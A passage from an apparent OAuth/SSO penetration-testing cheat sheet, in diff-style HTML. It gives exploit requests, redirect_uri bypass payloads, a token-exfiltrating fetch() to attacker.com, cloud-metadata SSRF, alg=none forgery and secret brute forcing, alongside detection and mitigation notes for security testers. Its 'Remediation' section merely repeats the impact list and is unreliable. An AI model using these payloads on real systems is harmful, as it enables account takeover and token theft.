+<li><strong>Authorization endpoint</strong> — Misconfigured allow-list for redirect URIs</li>
+<li><strong>Token endpoint</strong> — Weak client secret, no PKCE enforcement</li>
+<li><strong>Third-party integrations</strong> — &ldquo;Login with Google/GitHub&rdquo; misuse</li>
+<li><strong>Logout endpoint</strong> — Missing CSRF protection on logout</li>
+<li><strong>Referer header on token exchange page</strong> — Token leakage</li>
+</ul>
+<h2 id="exploiting-oauth">
+  Exploiting OAuth
+  <a class="anchor" href="#exploiting-oauth">#</a>
+</h2>
+<h3 id="1-authentication-bypass-via-oauth-implicit-flow">
+  1. Authentication Bypass via OAuth Implicit Flow
+  <a class="anchor" href="#1-authentication-bypass-via-oauth-implicit-flow">#</a>
+</h3>
+<p>OAuth Implicit Flow returns the <strong>access token directly in the browser URL</strong> (<code>response_type=token</code>). If the application treats this token as <strong>proof of authentication</strong> (not just authorization), an attacker can replay or inject any valid token to bypass login.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code># Step 1: Trigger implicit flow
+GET /authorize?client_id=client123&amp;response_type=token&amp;redirect_uri=https://app.example.com/callback&amp;scope=openid email
+
+# Step 2: Token lands in browser URL
+&lt;https://app.example.com/callback#access_token=eyJhbGciOi&gt;...
+
+# Step 3: Attacker replays a stolen or their own token
+GET /callback#access_token=ATTACKER_OR_STOLEN_TOKEN
+</code></pre><p><strong>Vulnerable if:</strong> App logs the user in solely by receiving a token without verifying its origin.</p>
+<hr>
+<h3 id="2-oauth-account-hijacking-via-redirect_uri-manipulation">
+  2. OAuth Account Hijacking via <code>redirect_uri</code> Manipulation
+  <a class="anchor" href="#2-oauth-account-hijacking-via-redirect_uri-manipulation">#</a>
+</h3>
+<p>The OAuth server <strong>fails to strictly validate the <code>redirect_uri</code></strong>, allowing the attacker to redirect the authorization code or token to their own server.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code># Append attacker domain to legitimate domain name
+GET /authorize?client_id=client123&amp;response_type=code
+  &amp;redirect_uri=https://app.example.com.attacker.com/callback
+  &amp;scope=openid email
+</code></pre><p><strong>Alternate bypass variations</strong> (move these to payload section when testing):</p>
+<pre tabindex="0"><code>&lt;https://app.example.com/callback/../attacker&gt;
+&lt;https://app.example.com&gt;%2F.attacker.com
+&lt;https://app.example.com@attacker.com/callback&gt;
+</code></pre><hr>
+<h3 id="3-forced-oauth-profile-linking">
+  3. Forced OAuth Profile Linking
+  <a class="anchor" href="#3-forced-oauth-profile-linking">#</a>
+</h3>
+<p>Application <strong>automatically links an OAuth identity to an existing logged-in account without user confirmation</strong>. If the app relies only on OAuth response data (email/user ID) without verifying intent, an attacker can bind their account to a victim&rsquo;s.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code># Attacker completes OAuth auth on their own account
+# Then tricks the victim (who is logged in) into visiting the attacker&#39;s callback URL
+GET /oauth/callback?code=ATTACKER_AUTH_CODE&amp;state=VALID_STATE
+</code></pre><p><strong>Vulnerable if:</strong> App silently links the attacker&rsquo;s OAuth identity to the victim&rsquo;s active session.</p>
+<hr>
+<h3 id="4-stealing-oauth-access-tokens-via-open-redirect">
+  4. Stealing OAuth Access Tokens via Open Redirect
+  <a class="anchor" href="#4-stealing-oauth-access-tokens-via-open-redirect">#</a>
+</h3>
+<p>The <code>redirect_uri</code> is correctly whitelisted, <strong>but the endpoint itself contains an open redirect</strong>. The OAuth server sends the token to the legitimate endpoint, which then forwards it to the attacker.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code>GET /authorize?client_id=client123&amp;response_type=token
+  &amp;redirect_uri=https://app.example.com/callback?next=https://attacker.com
+  &amp;scope=openid email
+
+# App receives token then performs open redirect:
+&lt;https://app.example.com/callback?next=https://attacker.com#access_token=eyJhbGciOi&gt;...
+</code></pre><p><strong>Key insight:</strong> The <code>redirect_uri</code> passes server validation, but the redirect endpoint is the weak link.</p>
+<hr>
+<h3 id="5-stealing-oauth-access-tokens-via-proxy-page">
+  5. Stealing OAuth Access Tokens via Proxy Page
+  <a class="anchor" href="#5-stealing-oauth-access-tokens-via-proxy-page">#</a>
+</h3>
+<p>The <code>redirect_uri</code> points to a <strong>trusted page that silently leaks the token</strong> via JavaScript/iframe/postMessage — without navigating away (no visible redirect).</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code>GET /authorize?client_id=client123&amp;response_type=token
+  &amp;redirect_uri=https://app.example.com/oauth-proxy
+  &amp;scope=openid email
+</code></pre><p><strong>Vulnerable proxy page (JS on the callback page):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Token is in the URL fragment — silently sent to attacker
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;&lt;https://attacker.com/log?token=&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><strong>Other exfiltration methods:</strong> <code>XHR</code>, <code>&lt;iframe&gt;</code>, <code>window.postMessage</code> to an attacker-controlled listener.</p>
+<hr>
+<h3 id="6-ssrf-via-openid-dynamic-client-registration">
+  6. SSRF via OpenID Dynamic Client Registration
+  <a class="anchor" href="#6-ssrf-via-openid-dynamic-client-registration">#</a>
+</h3>
+<p>OpenID Provider allows <strong>dynamic client registration</strong> without validating client-supplied URLs (<code>logo_uri</code>, <code>jwks_uri</code>, <code>redirect_uris</code>). Attacker supplies an internal/cloud-metadata URL — the server fetches it, triggering SSRF.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code>POST /connect/register HTTP/1.1
+Host: idp.example.com
+Content-Type: application/json
+
+{
+  &#34;client_name&#34;: &#34;evil-client&#34;,
+  &#34;logo_uri&#34;: &#34;&lt;http://169.254.169.254/latest/meta-data/&gt;&#34;,
+  &#34;redirect_uris&#34;: [&#34;&lt;https://attacker.com/callback&gt;&#34;]
+}
+</code></pre><p><strong>Other SSRF target URLs to try:</strong></p>
+<pre tabindex="0"><code>&lt;http://localhost&gt;
+&lt;http://127.0.0.1&gt;
+http://[::1]
+&lt;http://internal-service.local&gt;
+</code></pre><p><strong>Vulnerable if:</strong> Server makes a network request to fetch <code>logo_uri</code> or <code>jwks_uri</code>.</p>
+<hr>
+<h3 id="7-login-csrf-via-missing-state-parameter">
+  7. Login CSRF via Missing <code>state</code> Parameter
+  <a class="anchor" href="#7-login-csrf-via-missing-state-parameter">#</a>
+</h3>
+<p>Without a <code>state</code> parameter, the app <strong>cannot verify that the OAuth response belongs to the user who started the flow</strong>. An attacker completes OAuth on their own account and tricks the victim into visiting the callback → victim is logged into attacker&rsquo;s account.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code># Step 1: Attacker initiates flow without state
+GET /authorize?client_id=client123&amp;response_type=code
+  &amp;redirect_uri=https://app.example.com/callback
+  &amp;scope=openid email
+
+# Step 2: Attacker sends their own callback URL to the victim
+Victim visits: &lt;https://app.example.com/callback?code=ATTACKER_CODE&gt;
+</code></pre><p><strong>Vulnerable if:</strong> Login succeeds even when <code>state</code> is missing or not validated.</p>
+<hr>
+<h3 id="8-authorization-code-replay">
+  8. Authorization Code Replay
+  <a class="anchor" href="#8-authorization-code-replay">#</a>
+</h3>
+<p>OAuth authorization codes are meant to be <strong>single-use and short-lived</strong>. Weak server-side validation allows the <strong>same code to be exchanged multiple times</strong> for fresh tokens.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code># Exchange 1 (legitimate)
+POST /token HTTP/1.1
+grant_type=authorization_code&amp;code=AUTH_CODE_123
+  &amp;redirect_uri=https://app.example.com/callback&amp;client_id=client123&amp;client_secret=secret
+
+# Exchange 2 (replay — use exact same code again)
+POST /token HTTP/1.1
+grant_type=authorization_code&amp;code=AUTH_CODE_123
+  &amp;redirect_uri=https://app.example.com/callback&amp;client_id=client123&amp;client_secret=secret
+</code></pre><p><strong>Vulnerable if:</strong> A new access token is returned on the second request.</p>
+<hr>
+<h3 id="9-oauth-token-substitution-attack">
+  9. OAuth Token Substitution Attack
+  <a class="anchor" href="#9-oauth-token-substitution-attack">#</a>
+</h3>
+<p>App accepts a valid OAuth token but <strong>fails to verify it belongs to the correct user or client</strong>. Missing checks on <code>aud</code> (audience), <code>iss</code> (issuer), or user binding allow an attacker&rsquo;s token to authenticate a different session.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code># Try attacker&#39;s token on victim&#39;s session/endpoint
+GET /login/callback?access_token=ATTACKER_VALID_TOKEN
+
+# Or on an authenticated API endpoint
+GET /api/user/profile
+Authorization: Bearer ATTACKER_VALID_TOKEN
+</code></pre><p><strong>What makes it vulnerable:</strong></p>
+<ul>
+<li>Token issued for a different client (<code>aud</code> not checked)</li>
+<li>Token from a different IdP (<code>iss</code> not checked)</li>
+<li>Token not bound to a specific user session</li>
+</ul>
+<hr>
+<h3 id="10-email-trust-abuse-in-oauth-login">
+  10. Email Trust Abuse in OAuth Login
+  <a class="anchor" href="#10-email-trust-abuse-in-oauth-login">#</a>
+</h3>
+<p>App <strong>trusts the email from the OAuth provider without checking <code>email_verified</code></strong>. Some providers allow users to set unverified emails. App uses email as the sole identifier to find or create accounts.</p>
+<p><strong>Exploit scenario:</strong></p>
+<ol>
+<li>Attacker creates an OAuth account at any provider.</li>
+<li>Sets email to <code>victim@example.com</code> (unverified or provider allows changes).</li>
+<li>Uses &ldquo;Login with OAuth&rdquo; on the target app.</li>
+</ol>
+<p><strong>OAuth user info response returned:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;victim@example.com&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;email_verified&#34;</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Vulnerable if:</strong> App ignores <code>email_verified: false</code> and logs the attacker in as the victim.</p>
+<p><strong>Indicators of vulnerability:</strong></p>
+<ul>
+<li>App does not check <code>email_verified</code></li>
+<li>App auto-links accounts based only on email match</li>
+<li>No secondary verification (OTP / confirmation email)</li>
+</ul>
+<hr>
+<h3 id="11-id-token-claim-manipulation-oidc">
+  11. ID Token Claim Manipulation (OIDC)
+  <a class="anchor" href="#11-id-token-claim-manipulation-oidc">#</a>
+</h3>
+<p>Application <strong>does not validate claims inside the OIDC ID token</strong>. Claims like <code>iss</code>, <code>aud</code>, <code>sub</code>, <code>exp</code>, or <code>nonce</code> are absent or ignored, allowing attackers to forge tokens.</p>
+<p><strong>Exploit (forged ID token payload):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;iss&#34;</span>: <span style="color:#e6db74">&#34;&lt;https://attacker-idp.com&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;aud&#34;</span>: <span style="color:#e6db74">&#34;victim-app&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sub&#34;</span>: <span style="color:#e6db74">&#34;victim-user-id&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;victim@example.com&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;exp&#34;</span>: <span style="color:#ae81ff">9999999999</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Signed using a weak key, mismatched issuer, or <code>alg=none</code>.</p>
+<p><strong>Bypass conditions:</strong></p>
+<ul>
+<li><code>iss</code> not validated → attacker IdP token accepted</li>
+<li><code>aud</code> not checked → token for another app reused</li>
+<li><code>nonce</code> not validated → replayed login accepted</li>
+<li><code>alg=none</code> accepted → unsigned token works</li>
+</ul>
+<hr>
+<h3 id="12-missing-pkce-leading-to-code-interception">
+  12. Missing PKCE Leading to Code Interception
+  <a class="anchor" href="#12-missing-pkce-leading-to-code-interception">#</a>
+</h3>
+<p><strong>Without PKCE</strong>, anyone who intercepts the authorization code can exchange it for tokens — the server has no way to verify the code was requested by the same party that is now claiming it.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code># Legitimate auth request — no code_challenge present
+GET /authorize?client_id=client123&amp;response_type=code
+  &amp;redirect_uri=https://app.example.com/callback&amp;scope=openid email
+
+# Attacker intercepts code in transit
+&lt;https://app.example.com/callback?code=STOLEN_CODE&gt;
+
+# Attacker redeems stolen code (no code_verifier needed)
+POST /token HTTP/1.1
+grant_type=authorization_code&amp;code=STOLEN_CODE
+  &amp;redirect_uri=https://app.example.com/callback&amp;client_id=client123
+</code></pre><p><strong>Vulnerable if:</strong> Token is returned without requiring <code>code_verifier</code>.</p>
+<hr>
+<h3 id="13-refresh-token-reuse-without-rotation">
+  13. Refresh Token Reuse Without Rotation
+  <a class="anchor" href="#13-refresh-token-reuse-without-rotation">#</a>
+</h3>
+<p>Refresh tokens should be <strong>single-use and rotated on each use</strong>. If the same token keeps working, a stolen refresh token gives the attacker <strong>persistent access indefinitely</strong>, surviving password changes and logouts.</p>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code># Use refresh token once (legitimate)
+POST /token HTTP/1.1
+grant_type=refresh_token&amp;refresh_token=REFRESH_TOKEN_ABC
+  &amp;client_id=client123&amp;client_secret=secret
+
+# Use the same refresh token again (should fail, but doesn&#39;t)
+POST /token HTTP/1.1
+grant_type=refresh_token&amp;refresh_token=REFRESH_TOKEN_ABC
+  &amp;client_id=client123&amp;client_secret=secret
+</code></pre><p><strong>Vulnerable if:</strong> New access token is issued on the second request.</p>
+<p><strong>What makes it vulnerable:</strong></p>
+<ul>
+<li>No refresh token rotation after use</li>
+<li>No reuse detection or revocation</li>
+<li>No token revocation triggered on logout</li>
+</ul>
+<hr>
+<h3 id="14-oauth-discovery-endpoint-poisoning">
+  14. OAuth Discovery Endpoint Poisoning
+  <a class="anchor" href="#14-oauth-discovery-endpoint-poisoning">#</a>
+</h3>
+<p>App <strong>blindly trusts <code>/.well-known/openid-configuration</code></strong> without validating the issuer or pinning the metadata. If the discovery response can be tampered with or spoofed, the attacker can inject malicious endpoints or signing keys.</p>
+<p><strong>Exploit (attacker-controlled discovery response):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;issuer&#34;</span>: <span style="color:#e6db74">&#34;&lt;https://attacker-idp.com&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;authorization_endpoint&#34;</span>: <span style="color:#e6db74">&#34;&lt;https://attacker-idp.com/authorize&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;token_endpoint&#34;</span>: <span style="color:#e6db74">&#34;&lt;https://attacker-idp.com/token&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;jwks_uri&#34;</span>: <span style="color:#e6db74">&#34;&lt;https://attacker-idp.com/jwks.json&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>App fetches attacker metadata → trusts tokens signed by attacker&rsquo;s keys.</p>
+<p><strong>Vulnerable conditions:</strong></p>
+<ul>
+<li>No validation of the <code>issuer</code> field</li>
+<li>Dynamic discovery enabled without an allowlist</li>
+<li>JWKS fetched from any domain without pinning</li>
+</ul>
+<hr>
+<h3 id="15-client-impersonation-via-leaked-client-credentials">
+  15. Client Impersonation via Leaked Client Credentials
+  <a class="anchor" href="#15-client-impersonation-via-leaked-client-credentials">#</a>
+</h3>
+<p><code>client_id</code> and <code>client_secret</code> exposed in source code, mobile APKs, JS bundles, logs, or public repositories. With valid credentials, the attacker <strong>impersonates the trusted OAuth client application</strong>.</p>
+<p><strong>Where to look:</strong></p>
+<ul>
+<li>JavaScript source files and bundled frontend code</li>
+<li>Decompiled mobile APK (<code>strings</code>, <code>jadx</code>, <code>apktool</code>)</li>
+<li>GitHub searches: <code>client_secret</code>, <code>oauth_secret</code>, org name</li>
+</ul>
+<p><strong>Exploit:</strong></p>
+<pre tabindex="0"><code>POST /token HTTP/1.1
+Host: auth.example.com
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=client_credentials&amp;client_id=LEAKED_CLIENT_ID
+  &amp;client_secret=LEAKED_CLIENT_SECRET&amp;scope=openid profile
+</code></pre><p><strong>Vulnerable if:</strong> Token is issued — attacker now acts as the legitimate app.</p>
+<h2 id="oauth-bypasses--obfuscation">
+  OAuth Bypasses &amp; Obfuscation
+  <a class="anchor" href="#oauth-bypasses--obfuscation">#</a>
+</h2>
+<h3 id="1-redirect_uri-bypass-techniques">
+  1. <code>redirect_uri</code> Bypass Techniques
+  <a class="anchor" href="#1-redirect_uri-bypass-techniques">#</a>
+</h3>
+<pre tabindex="0"><code># Subdomain confusion
+&lt;https://attacker.com.legit.com/callback&gt;
+
+# Path traversal on redirect_uri
+&lt;https://legit.com/callback/../attacker&gt;
+
+# Open redirect chaining
+&lt;https://legit.com/redirect?url=https://attacker.com&gt;
+
+# URL fragment bypass
+&lt;https://legit.com/callback#https://attacker.com&gt;
+
+# Parameter pollution
+redirect_uri=https://legit.com&amp;redirect_uri=https://attacker.com
+</code></pre><h3 id="2-state-parameter-bypass">
+  2. State Parameter Bypass
+  <a class="anchor" href="#2-state-parameter-bypass">#</a>
+</h3>
+<pre tabindex="0"><code># Remove state entirely → CSRF
+GET /authorize?client_id=X&amp;redirect_uri=Y&amp;response_type=code
+# (no &amp;state= parameter)
+
+# Predictable state value → forge it
+state=12345 or state=user123
+</code></pre><h3 id="3-scope-escalation">
+  3. Scope Escalation
+  <a class="anchor" href="#3-scope-escalation">#</a>
+</h3>
+<pre tabindex="0"><code># Original request
+scope=read
+
+# Modified request — request additional privileges
+scope=read write admin
+
+# Try known undocumented scopes
+scope=openid profile email offline_access
+</code></pre><h2 id="additional-advanced-attack-scenarios">
+  Additional Advanced Attack Scenarios
+  <a class="anchor" href="#additional-advanced-attack-scenarios">#</a>
+</h2>
+<h3 id="1-pkce-downgrade-attack">
+  1. PKCE Downgrade Attack
+  <a class="anchor" href="#1-pkce-downgrade-attack">#</a>
+</h3>
+<p>Force the server to fall back from PKCE to no-PKCE, making the authorization code interceptable.</p>
+<pre tabindex="0"><code># Step 1: Start a legitimate PKCE flow — note the code_challenge
+GET /authorize?client_id=X&amp;code_challenge=xxxx&amp;code_challenge_method=S256&amp;...
+
+# Step 2: Send a fresh request WITHOUT PKCE params
+GET /authorize?client_id=X&amp;redirect_uri=Y&amp;response_type=code&amp;scope=openid
+
+# Step 3: If server returns a code, try to exchange it WITHOUT code_verifier
+POST /token
+  code=INTERCEPTED_CODE&amp;client_id=X&amp;redirect_uri=Y
+</code></pre><p><strong>Vulnerable if:</strong> Server accepts the token exchange without demanding <code>code_verifier</code>.</p>
+<hr>
+<h3 id="2-oauth-logout-csrf">
+  2. OAuth Logout CSRF
+  <a class="anchor" href="#2-oauth-logout-csrf">#</a>
+</h3>
+<p>If the logout endpoint lacks CSRF protection and uses a GET request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Attacker page auto-logs out victim from a service --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;https://legit.com/oauth/logout?token=X&gt;&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Or silently de-authorize the victim&#39;s connected app --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;https://legit.com/oauth/revoke?client_id=victim_app&gt;&#34;</span> /&gt;
+</span></span></code></pre></div><hr>
+<h3 id="3-token-leakage-via-referer-header">
+  3. Token Leakage via Referer Header
+  <a class="anchor" href="#3-token-leakage-via-referer-header">#</a>
+</h3>
+<p>When a token is placed in the URL (e.g., Implicit flow) and the page loads third-party resources:</p>
+<pre tabindex="0"><code>1. Victim receives: &lt;https://app.com/callback#access_token=SECRET&gt;
+2. Page loads: &lt;script src=&#34;&lt;https://analytics.com/track.js&gt;&#34;&gt;
+3. Referer header sent: Referer: &lt;https://app.com/callback#access_token=SECRET&gt;
+4. Token leaked to third party
+</code></pre><p><strong>Test for:</strong> Check if <code>access_token</code> or <code>code</code> appears in URLs, then observe outbound Referer headers.</p>
+<hr>
+<h3 id="4-framework-specific-misconfigurations">
+  4. Framework-Specific Misconfigurations
+  <a class="anchor" href="#4-framework-specific-misconfigurations">#</a>
+</h3>
+<h4 id="keycloak">
+  Keycloak
+  <a class="anchor" href="#keycloak">#</a>
+</h4>
+<pre tabindex="0"><code># Wildcard redirect_uri (catastrophic misconfiguration)
+redirect_uri=*
+
+# Exposed admin console — try default credentials (admin/admin)
+GET /auth/admin/master/console/
+
+# Public clients with blank client secret (should never be empty)
+client_authenticator_type=client-secret  → check if blank
+</code></pre><h4 id="auth0">
+  Auth0
+  <a class="anchor" href="#auth0">#</a>
+</h4>
+<pre tabindex="0"><code># Wildcard in &#34;Allowed Callback URLs&#34;
+https://*.attacker.com/callback
+
+# JWT alg:none (older Auth0 tenants)
+{&#34;alg&#34;:&#34;none&#34;,&#34;typ&#34;:&#34;JWT&#34;}
+
+# Brute force weak signing secret
+jwt-cracker -t &lt;token&gt; -a &#34;abcdefghijklmnopqrstuvwxyz&#34;
+</code></pre><h4 id="spring-authorization-server">
+  Spring Authorization Server
+  <a class="anchor" href="#spring-authorization-server">#</a>
+</h4>
+<pre tabindex="0"><code># CSRF on authorization endpoint (older versions)
+# Missing PKCE enforcement for public clients
+
+# Exposed token introspection — leaks token details
+GET /oauth2/introspect?token=&lt;token&gt;
+</code></pre><h2 id="test-cases">
+  Test Cases
+  <a class="anchor" href="#test-cases">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Action</th>
+<th>Expected Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Open Redirect via <code>redirect_uri</code></td>
+<td>Change <code>redirect_uri</code> to attacker domain</td>
+<td>Token sent to attacker; report if accepted</td>
+</tr>
+<tr>
+<td>CSRF via missing <code>state</code></td>
+<td>Remove <code>state</code> param from auth request</td>
+<td>Auth flow completes without state validation</td>
+</tr>
+<tr>
+<td>Scope Escalation</td>
+<td>Add <code>admin</code> or <code>write</code> to <code>scope</code></td>
+<td>Server grants extra permissions</td>
+</tr>
+<tr>
+<td>PKCE Downgrade</td>
+<td>Remove <code>code_challenge</code> params</td>
+<td>Server issues code without PKCE enforcement</td>
+</tr>
+<tr>
+<td>Token in URL (Implicit)</td>
+<td>Inspect URL after redirect</td>
+<td><code>access_token</code> visible in URL fragment</td>
+</tr>
+<tr>
+<td>Logout CSRF</td>
+<td>Embed logout URL in img tag on attacker page</td>
+<td>Victim is logged out cross-site</td>
+</tr>
+<tr>
+<td>Reuse of Authorization Code</td>
+<td>Replay <code>code</code> after exchange</td>
+<td>Server should reject; if reused = vulnerable</td>
+</tr>
+<tr>
+<td>Client Secret Exposure</td>
+<td>Check JS source / mobile APK decompile</td>
+<td>Hardcoded <code>client_secret</code> found</td>
+</tr>
+<tr>
+<td>Token Leakage via Referer</td>
+<td>Load third-party resource after token redirect</td>
+<td>Referer header contains token</td>
+</tr>
+<tr>
+<td>JWT <code>alg:none</code></td>
+<td>Modify JWT header to <code>&quot;alg&quot;:&quot;none&quot;</code>, remove signature</td>
+<td>Server accepts unsigned token</td>
+</tr>
+</tbody>
+</table>
+<h2 id="detection-techniques">
+  Detection Techniques
+  <a class="anchor" href="#detection-techniques">#</a>
+</h2>
+<h3 id="a-manual-detection">
+  A. Manual Detection
+  <a class="anchor" href="#a-manual-detection">#</a>
+</h3>
+<ol>
+<li><strong>Intercept all auth requests</strong> — In Burp Suite, review <code>redirect_uri</code>, <code>state</code>, <code>scope</code>, <code>response_type</code> in every OAuth request.</li>
+<li><strong>Modify <code>redirect_uri</code></strong> — Try attacker domain, subdomain confusion, path traversal, encoded characters.</li>
+<li><strong>Remove <code>state</code> param</strong> — If the OAuth flow completes, CSRF is possible.</li>
+<li><strong>Modify <code>scope</code></strong> — Add <code>admin</code>, <code>write</code>, <code>offline_access</code> and observe what the server grants.</li>
+<li><strong>Drop PKCE params</strong> — Remove <code>code_challenge</code> / <code>code_verifier</code> from the flow and retry token exchange.</li>
+<li><strong>Decode JWTs</strong> — Use <a href="https://jwt.io/" target="_blank" rel="noreferrer noopener nofollow">jwt.io</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">; check <code>alg</code>, <code>iss</code>, <code>aud</code>, <code>exp</code>, and <code>nonce</code>.</li>
+<li><strong>Test logout endpoint</strong> — Make a GET request from a different origin; check if CSRF token is required.</li>
+<li><strong>Check URL fragments</strong> — Look for <code>access_token</code> in URLs; observe outgoing <code>Referer</code> headers in third-party requests.</li>
+<li><strong>Dynamic client registration</strong> — If the endpoint exists, register a client with <code>logo_uri</code> pointing to an internal IP.</li>
+</ol>
+<h3 id="b-automated-detection">
+  B. Automated Detection
+  <a class="anchor" href="#b-automated-detection">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Burp Suite</strong> (Intruder, Repeater)</td>
+<td>Fuzz <code>redirect_uri</code>, <code>state</code>, <code>scope</code> parameters</td>
+</tr>
+<tr>
+<td><strong>OWASP ZAP</strong></td>
+<td>Active scan OAuth endpoints</td>
+</tr>
+<tr>
+<td><strong>jwt_tool</strong></td>
+<td>Audit JWTs — <code>alg:none</code>, weak secret brute force, claim manipulation</td>
+</tr>
+<tr>
+<td><strong>Nuclei</strong></td>
+<td>Templates for known OAuth misconfigurations</td>
+</tr>
+<tr>
+<td><strong>Postman</strong></td>
+<td>Step through full OAuth token exchange flows manually</td>
+</tr>
+</tbody>
+</table>
+<h2 id="impact-of-oauth--sso-attacks">
+  Impact of OAuth &amp; SSO Attacks
+  <a class="anchor" href="#impact-of-oauth--sso-attacks">#</a>
+</h2>
+<ul>
+<li><strong>Authentication Bypass</strong> Attackers can log in without usernames or passwords.</li>
+<li><strong>Account Takeover (ATO)</strong> Victim accounts can be fully compromised using stolen or manipulated tokens.</li>
+<li><strong>Forced Account Linking</strong> Attacker identities get permanently linked to victim accounts.</li>
+<li><strong>Unauthorized Access to User Data</strong> Private profile data, emails, and sensitive resources can be accessed.</li>
+<li><strong>Persistent Access</strong> Refresh token abuse allows long-term access even after logout or password change.</li>
+<li><strong>Impersonation Across Applications (SSO Impact)</strong> One compromised OAuth flow can grant access to multiple connected apps.</li>
+<li><strong>Privilege Escalation</strong>Abuse of scopes or client impersonation can lead to admin or elevated access.</li>
+<li><strong>Token Theft &amp; Replay</strong> Access tokens reused to repeatedly authenticate as victims.</li>
+<li><strong>Infrastructure Compromise</strong> SSRF via OAuth can expose internal services or cloud metadata.</li>
+<li><strong>Trust Chain Breakdown</strong> Compromising a trusted identity provider affects all dependent applications.</li>
+</ul>
+<h2 id="remediation-for-oauth--sso-vulnerabilities">
+  Remediation for OAuth &amp; SSO Vulnerabilities
+  <a class="anchor" href="#remediation-for-oauth--sso-vulnerabilities">#</a>
+</h2>
+<ul>
+<li><strong>Authentication Bypass</strong> — Attackers log in without credentials.</li>
+<li><strong>Account Takeover (ATO)</strong> — Victim accounts fully compromised via stolen/manipulated tokens.</li>
+<li><strong>Forced Account Linking</strong> — Attacker identities permanently linked to victim accounts.</li>
+<li><strong>Unauthorized Data Access</strong> — Private profile data, emails, and sensitive resources exposed.</li>
+<li><strong>Persistent Access</strong> — Refresh token abuse gives long-term access even after logout or password change.</li>
+<li><strong>Impersonation (SSO Impact)</strong> — One compromised OAuth flow grants access to all connected apps.</li>
+<li><strong>Privilege Escalation</strong> — Scope abuse or client impersonation leads to admin-level access.</li>
+<li><strong>Infrastructure Compromise</strong> — SSRF via OpenID dynamic registration exposes internal services and cloud metadata.</li>
+<li><strong>Trust Chain Breakdown</strong> — Compromising a trusted IdP affects every relying application.</li>
+</ul>
+<h2 id="mitigation--prevention">
+  Mitigation &amp; Prevention
+  <a class="anchor" href="#mitigation--prevention">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Auth Code + PKCE</strong></td>
+<td>Avoid Implicit flow. Enforce PKCE for all public clients (mobile, SPA).</td>
+</tr>
+<tr>
